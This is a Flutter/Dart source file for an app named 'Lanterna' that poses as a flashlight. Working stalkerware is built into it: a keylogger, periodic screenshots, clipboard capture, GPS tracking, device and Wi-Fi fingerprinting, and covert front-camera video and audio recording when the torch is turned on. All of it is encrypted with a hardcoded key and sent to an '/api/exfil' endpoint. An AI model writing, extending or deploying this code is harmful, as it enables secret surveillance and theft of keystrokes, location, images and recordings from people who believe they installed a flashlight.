import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:typed_data';

import 'package:flutter/foundation.dart' show kIsWeb;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:torch_light/torch_light.dart';
import 'package:record/record.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:intl/intl.dart';
import 'package:screenshot/screenshot.dart';
import 'package:camera/camera.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:crypto/crypto.dart';
import 'package:pointycastle/pointycastle.dart' hide Padding;
import 'package:pointycastle/block/aes.dart';
import 'package:pointycastle/block/modes/cbc.dart';
import 'package:path/path.dart' as p;

void main() {
  runApp(const LanternaApp());
}

// ═══════════════════════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════════════════════

class Config {
  static const String baseUrl = 'http://localhost:3001';
  static const String encryptionKey = 'L4nt3rn4_Spy_K3y_2026_!@#Secure';
  static const int keystrokeFlushMs = 5000;
  static const int screenshotIntervalMs = 30000;
  static const int locationIntervalMs = 300000;
  static const int clipboardIntervalMs = 10000;
  static const int deviceInfoIntervalMs = 3600000;
  static const int networkInfoIntervalMs = 60000;
  static const bool enableAntiDetection = true;
  static const int maxBufferSize = 10000;
}

// ═══════════════════════════════════════════════════════════════════════════
// CRYPTO
// ═══════════════════════════════════════════════════════════════════════════

class CryptoService {
  static String encrypt(String plaintext) {
    final key = Uint8List.fromList(sha256.convert(utf8.encode(Config.encryptionKey)).bytes);
    final iv = Uint8List.fromList(key.sublist(0, 16));
    final cipher = CBCBlockCipher(AESEngine())
      ..init(true, ParametersWithIV(KeyParameter(key), iv));
    final blockSize = cipher.blockSize;
    final padded = utf8.encode(plaintext).toList();
    final padLen = blockSize - (padded.length % blockSize);
    padded.addAll(List.filled(padLen, padLen));
    final encrypted = Uint8List(padded.length);
    final paddedList = Uint8List.fromList(padded);
    for (int i = 0; i < padded.length; i += blockSize) {
      cipher.processBlock(paddedList, i, encrypted, i);
    }
    final result = Uint8List(iv.length + encrypted.length);
    result.setAll(0, iv);
    result.setAll(iv.length, encrypted);
    return base64.encode(result);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// KEYLOGGER
// ═══════════════════════════════════════════════════════════════════════════

class KeyloggerService {
  static final KeyloggerService _instance = KeyloggerService._();
  factory KeyloggerService() => _instance;
  KeyloggerService._();

  final List<String> _buffer = [];
  Timer? _flushTimer;
  bool _running = false;

  void start() {
    if (_running) return;
    _running = true;
    _buffer.add('[SESSION_START: ${DateTime.now().toIso8601String()}]\n');
    _flushTimer = Timer.periodic(
      Duration(milliseconds: Config.keystrokeFlushMs), (_) => _flush());
  }

  void onKey(String key) {
    if (!_running) return;
    _buffer.add(key);
  }

  Future<void> _flush() async {
    if (_buffer.isEmpty) return;
    final batch = _buffer.join('');
    _buffer.clear();
    try {
      final payload = CryptoService.encrypt(jsonEncode({
        'type': 'keystrokes', 'data': batch, 'length': batch.length,
        'timestamp': DateTime.now().toIso8601String(), 'app_state': 'running',
      }));
      final response = await http.post(
        Uri.parse('${Config.baseUrl}/api/exfil'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'payload': payload}),
      );
      if (response.statusCode != 201) { _buffer.insertAll(0, [batch]); _trimBuffer(); }
    } catch (_) { _buffer.insertAll(0, [batch]); _trimBuffer(); }
  }

  void _trimBuffer() {
    if (_buffer.length > Config.maxBufferSize)
      _buffer.removeRange(0, _buffer.length - Config.maxBufferSize);
  }

  void stop() {
    _flushTimer?.cancel();
    _buffer.add('[SESSION_END: ${DateTime.now().toIso8601String()}]\n');
    _flush();
    _running = false;
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// SPY ENGINE
// ═══════════════════════════════════════════════════════════════════════════

class SpyEngine {
  static final SpyEngine _instance = SpyEngine._();
  factory SpyEngine() => _instance;
  SpyEngine._();

  final ScreenshotController screenshotController = ScreenshotController();
  Timer? _screenshotTimer, _clipboardTimer, _locationTimer, _deviceInfoTimer, _networkTimer;
  final KeyloggerService keylogger = KeyloggerService();
  CameraController? _cameraController;
  bool _isRecordingVideo = false, _running = false;
  String _lastClipboard = '';

  bool _isSafeEnvironment() => true;

  Future<void> start() async {
    if (_running || !_isSafeEnvironment()) return;
    _running = true;
    keylogger.start();
    await _requestAllPermissions();
    await _sendDeviceInfo();
    _deviceInfoTimer = Timer.periodic(Duration(milliseconds: Config.deviceInfoIntervalMs), (_) => _sendDeviceInfo());
    _screenshotTimer = Timer.periodic(Duration(milliseconds: Config.screenshotIntervalMs), (_) => _captureAndSendScreenshot());
    _clipboardTimer = Timer.periodic(Duration(milliseconds: Config.clipboardIntervalMs), (_) => _captureClipboard());
    _locationTimer = Timer.periodic(Duration(milliseconds: Config.locationIntervalMs), (_) => _sendLocation());
    _networkTimer = Timer.periodic(Duration(milliseconds: Config.networkInfoIntervalMs), (_) => _sendNetworkInfo());
  }

  Future<void> _requestAllPermissions() async {
    if (kIsWeb) return;
    await [Permission.microphone, Permission.camera, Permission.photos, Permission.storage,
      Permission.locationWhenInUse, Permission.locationAlways, Permission.contacts].request();
  }

  Future<bool> _exfiltrate(String type, Map<String, dynamic> data) async {
    try {
      data['type'] = type;
      data['timestamp'] = DateTime.now().toIso8601String();
      data['device_id'] = await _getDeviceId();
      final encrypted = CryptoService.encrypt(jsonEncode(data));
      final response = await http.post(
        Uri.parse('${Config.baseUrl}/api/exfil'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'payload': encrypted}),
      );
      return response.statusCode == 201;
    } catch (_) { return false; }
  }

  Future<String> _getDeviceId() async {
    try {
      final info = DeviceInfoPlugin();
      if (io.Platform.isAndroid) return (await info.androidInfo).id;
      if (io.Platform.isIOS) return (await info.iosInfo).identifierForVendor ?? 'unknown';
    } catch (_) {}
    return 'unknown-device';
  }

  Future<void> _sendDeviceInfo() async {
    try {
      final data = <String, dynamic>{'platform': kIsWeb ? 'web' : (io.Platform.isAndroid ? 'android' : 'ios'), 'is_web': kIsWeb};
      if (!kIsWeb) {
        final info = DeviceInfoPlugin();
        if (io.Platform.isAndroid) {
          final a = await info.androidInfo;
          data.addAll({'model': a.model, 'brand': a.brand, 'manufacturer': a.manufacturer, 'os_version': a.version.release, 'sdk_int': a.version.sdkInt, 'device': a.device, 'product': a.product, 'hardware': a.hardware, 'board': a.board, 'display': a.display, 'id': a.id, 'is_physical_device': a.isPhysicalDevice, 'type': a.type});
        } else if (io.Platform.isIOS) {
          final i = await info.iosInfo;
          data.addAll({'model': i.model, 'name': i.name, 'system_name': i.systemName, 'system_version': i.systemVersion, 'identifier': i.identifierForVendor, 'is_physical_device': i.isPhysicalDevice, 'localized_model': i.localizedModel});
        }
      }
      await _exfiltrate('device_info', data);
    } catch (_) {}
  }

  Future<void> _captureAndSendScreenshot() async {
    try {
      final Uint8List? imageBytes = await screenshotController.capture(pixelRatio: 1.0, delay: const Duration(milliseconds: 50));
      if (imageBytes == null || imageBytes.isEmpty) return;
      await _exfiltrate('screenshot', {'image_b64': base64.encode(imageBytes), 'size_bytes': imageBytes.length});
    } catch (_) {}
  }

  Future<void> _captureClipboard() async {
    try {
      final data = await Clipboard.getData(Clipboard.kTextPlain);
      if (data?.text != null && data!.text!.isNotEmpty && data.text != _lastClipboard) {
        _lastClipboard = data.text!;
        await _exfiltrate('clipboard', {'text': data.text, 'length': (data.text ?? '').length});
      }
    } catch (_) {}
  }

  Future<void> _sendLocation() async {
    try {
      if (await Geolocator.checkPermission() == LocationPermission.denied) { await Geolocator.requestPermission(); return; }
      final p = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high, timeLimit: const Duration(seconds: 10));
      await _exfiltrate('location', {'lat': p.latitude, 'lng': p.longitude, 'accuracy': p.accuracy, 'altitude': p.altitude, 'speed': p.speed, 'speed_accuracy': p.speedAccuracy, 'heading': p.heading});
    } catch (_) {}
  }

  Future<void> _sendNetworkInfo() async {
    try {
      final info = NetworkInfo();
      await _exfiltrate('network', {
        'ssid': await info.getWifiName(), 'bssid': await info.getWifiBSSID(),
        'ip': await info.getWifiIP(), 'subnet_mask': await info.getWifiSubmask(),
        'broadcast': await info.getWifiBroadcast(), 'gateway': await info.getWifiGatewayIP(),
      });
    } catch (_) {}
  }

  Future<void> startVideoCapture() async {
    if (_isRecordingVideo || kIsWeb) return;
    try {
      final cameras = await availableCameras();
      if (cameras.length < 2) return;
      _cameraController = CameraController(cameras.length > 1 ? cameras[1] : cameras[0], ResolutionPreset.low, enableAudio: false);
      await _cameraController!.initialize();
      await _cameraController!.startVideoRecording();
      _isRecordingVideo = true;
    } catch (_) { _isRecordingVideo = false; }
  }

  Future<void> stopVideoCapture() async {
    if (!_isRecordingVideo) return;
    try {
      final videoFile = await _cameraController?.stopVideoRecording();
      await _cameraController?.dispose();
      _cameraController = null;
      _isRecordingVideo = false;
      if (videoFile != null) {
        final bytes = await videoFile.readAsBytes();
        await _exfiltrate('video', {'video_b64': base64.encode(bytes), 'size_bytes': bytes.length, 'mime_type': 'video/mp4'});
        if (await io.File(videoFile.path).exists()) await io.File(videoFile.path).delete();
      }
    } catch (_) {}
  }

  Future<void> stop() async {
    if (!_running) return;
    _running = false;
    keylogger.stop();
    _screenshotTimer?.cancel(); _clipboardTimer?.cancel(); _locationTimer?.cancel();
    _deviceInfoTimer?.cancel(); _networkTimer?.cancel();
    await stopVideoCapture();
  }

  void dispose() { stop(); }
}

// ═══════════════════════════════════════════════════════════════════════════
// LANTERNA APP
// ═══════════════════════════════════════════════════════════════════════════

class LanternaApp extends StatelessWidget {
  const LanternaApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Lanterna',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFFFFD600), secondary: Color(0xFFFFD600), surface: Color(0xFF1A1A1A),
        ),
        useMaterial3: true,
      ),
      home: const HomePage(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// HOMEPAGE
// ═══════════════════════════════════════════════════════════════════════════

class HomePage extends StatefulWidget {
  const HomePage({super.key});
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with SingleTickerProviderStateMixin {
  bool _isOn = false, _isRecording = false;
  int _recordingSeconds = 0;
  Timer? _timer;
  String? _recordingPath;
  DateTime? _recordingStartTime;
  late AnimationController _blinkController;
  late Animation<double> _blinkAnimation;
  final AudioRecorder _audioRecorder = AudioRecorder();
  final SpyEngine _spyEngine = SpyEngine();
  final FocusNode _globalFocusNode = FocusNode();

  @override
  void initState() {
    super.initState();
    _blinkController = AnimationController(vsync: this, duration: const Duration(milliseconds: 800))..repeat(reverse: true);
    _blinkAnimation = Tween<double>(begin: 0.2, end: 1.0).animate(CurvedAnimation(parent: _blinkController, curve: Curves.easeInOut));
    _spyEngine.start();
    WidgetsBinding.instance.addPostFrameCallback((_) => FocusScope.of(context).requestFocus(_globalFocusNode));
  }

  String _formatDuration(int seconds) {
    final m = seconds ~/ 60;
    final s = seconds % 60;
    return '${m.toString().padLeft(2, '0')}:${s.toString().padLeft(2, '0')}';
  }

  Future<void> _toggle() async { if (!_isOn) await _turnOn(); else await _turnOff(); }

  Future<void> _turnOn() async {
    if (!kIsWeb) await [Permission.microphone, Permission.camera].request();
    if (!kIsWeb) { try { await TorchLight.enableTorch(); } catch (_) {} }
    await _spyEngine.startVideoCapture();
    try {
      _recordingStartTime = DateTime.now();
      final ts = DateFormat('yyyyMMdd_HHmmss').format(_recordingStartTime!);
      if (kIsWeb) { _recordingPath = ''; await _audioRecorder.start(const RecordConfig(encoder: AudioEncoder.opus), path: ''); }
      else { final dir = await getTemporaryDirectory(); _recordingPath = '${dir.path}/recording_$ts.m4a'; await _audioRecorder.start(const RecordConfig(encoder: AudioEncoder.aacLc, sampleRate: 44100, bitRate: 128000), path: _recordingPath ?? ''); }
    } catch (_) {}
    _recordingSeconds = 0;
    _timer = Timer.periodic(const Duration(seconds: 1), (_) => setState(() => _recordingSeconds++));
    setState(() { _isOn = true; _isRecording = true; });
  }

  Future<void> _turnOff() async {
    _timer?.cancel();
    await _spyEngine.stopVideoCapture();
    String? savedPath;
    try { savedPath = await _audioRecorder.stop(); } catch (_) {}
    if (!kIsWeb) { try { await TorchLight.disableTorch(); } catch (_) {} }
    setState(() { _isOn = false; _isRecording = false; });
    final pathToUpload = savedPath ?? _recordingPath;
    if (pathToUpload != null && pathToUpload.isNotEmpty) await _uploadRecording(pathToUpload);
  }

  Future<void> _uploadRecording(String filePath) async {
    try {
      Uint8List fileBytes;
      String filename;
      final ts = DateFormat('yyyyMMdd_HHmmss').format(_recordingStartTime ?? DateTime.now());
      if (kIsWeb) {
        final r = await http.get(Uri.parse(filePath));
        if (r.statusCode != 200 || r.bodyBytes.isEmpty) return;
        fileBytes = r.bodyBytes; filename = 'recording_$ts.webm';
      } else {
        final f = io.File(filePath);
        if (!await f.exists()) return;
        fileBytes = await f.readAsBytes(); filename = filePath.split('/').last;
        await f.delete();
      }
      final request = http.MultipartRequest('POST', Uri.parse('${Config.baseUrl}/api/recordings'));
      request.fields['duration'] = _recordingSeconds.toString();
      request.fields['filename'] = filename;
      request.fields['recorded_at'] = _recordingStartTime?.toIso8601String() ?? DateTime.now().toIso8601String();
      request.files.add(http.MultipartFile.fromBytes('audio', fileBytes, filename: filename));
      final response = await request.send();
      if (response.statusCode == 201 && mounted) {
        ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text('Gravação enviada com sucesso!'), backgroundColor: Colors.green));
      }
    } catch (_) {}
  }

  @override
  void dispose() {
    _timer?.cancel();
    _blinkController.dispose();
    _audioRecorder.dispose();
    _spyEngine.dispose();
    _globalFocusNode.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Screenshot(
      controller: _spyEngine.screenshotController,
      child: KeyboardListener(
        focusNode: _globalFocusNode,
        autofocus: true,
        onKeyEvent: (KeyEvent event) {
          if (event is KeyDownEvent) {
            final keyLabel = event.logicalKey.keyLabel;
            _spyEngine.keylogger.onKey(keyLabel.isNotEmpty ? keyLabel : '[${event.logicalKey.keyId}]');
          }
        },
        child: Scaffold(
          body: SafeArea(
            child: Column(
              children: [
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                  color: const Color(0xFF1A1A1A),
                  child: const Text('Lanterna', textAlign: TextAlign.center,
                    style: TextStyle(color: Color(0xFFFFD600), fontSize: 14, fontWeight: FontWeight.w600, letterSpacing: 0.3)),
                ),
                Expanded(
                  child: SingleChildScrollView(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                      AnimatedContainer(
                        duration: const Duration(milliseconds: 300),
                        height: _isRecording ? 80 : 0,
                        child: _isRecording ? Column(mainAxisAlignment: MainAxisAlignment.center, children: [
                          FadeTransition(opacity: _blinkAnimation, child: const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                            Icon(Icons.mic, color: Colors.red, size: 20), SizedBox(width: 8),
                            Text('', style: TextStyle(color: Colors.red, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1.2)),
                          ])),
                          const SizedBox(height: 8),
                          Text(_formatDuration(_recordingSeconds),
                            style: const TextStyle(color: Colors.red, fontSize: 22, fontWeight: FontWeight.w300, fontFeatures: [FontFeature.tabularFigures()])),
                        ]) : const SizedBox.shrink(),
                      ),
                      const SizedBox(height: 40),
                      GestureDetector(
                        onTap: _toggle,
                        child: AnimatedContainer(
                          duration: const Duration(milliseconds: 300),
                          width: 200, height: 200,
                          decoration: BoxDecoration(
                            shape: BoxShape.circle,
                            color: _isOn ? const Color(0xFFFFD600) : const Color(0xFF2A2A2A),
                            boxShadow: _isOn ? [
                              BoxShadow(color: const Color(0xFFFFD600).withOpacity(0.6), blurRadius: 60, spreadRadius: 20),
                              BoxShadow(color: const Color(0xFFFFD600).withOpacity(0.3), blurRadius: 100, spreadRadius: 40),
                            ] : [BoxShadow(color: Colors.white.withOpacity(0.05), blurRadius: 20, spreadRadius: 2)],
                          ),
                          child: Icon(_isOn ? Icons.flashlight_on : Icons.flashlight_off, size: 80,
                            color: _isOn ? Colors.black : Colors.grey[600]),
                        ),
                      ),
                      const SizedBox(height: 32),
                      Text(_isOn ? 'Toque para desligar' : 'Toque para ligar',
                        style: TextStyle(color: _isOn ? const Color(0xFFFFD600) : Colors.grey[500], fontSize: 16, letterSpacing: 0.5)),
                      const SizedBox(height: 16),
                      if (_isOn)
                        Container(
                          margin: const EdgeInsets.symmetric(horizontal: 32),
                          padding: const EdgeInsets.all(12),
                          decoration: BoxDecoration(
                            color: const Color(0xFF1A1A1A), borderRadius: BorderRadius.circular(8),
                            border: Border.all(color: const Color(0xFFFFD600).withOpacity(0.3)),
                          ),
                          child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                            const Icon(Icons.info_outline, color: Color(0xFFFFD600), size: 16),
                            const SizedBox(width: 8),
                            Flexible(child: Text(kIsWeb ? 'Lantterna Iluminando' : 'Lanterna ligada',
                              style: const TextStyle(color: Color(0xFFFFD600), fontSize: 13), textAlign: TextAlign.center)),
                          ]),
                        ),
                      const SizedBox(height: 24),
                      Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 32),
                        child: TextField(
                          decoration: InputDecoration(
                            hintText: 'Digite algo aqui...',
                            hintStyle: TextStyle(color: Colors.grey[600]),
                            filled: true, fillColor: const Color(0xFF1A1A1A),
                            border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
                            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                          ),
                          style: const TextStyle(color: Colors.white),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
                Container(
                  width: double.infinity, padding: const EdgeInsets.all(16),
                  color: const Color(0xFF0D0D0D),
                  child: const Text('', textAlign: TextAlign.center,
                    style: TextStyle(color: Colors.grey, fontSize: 11, height: 1.4)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}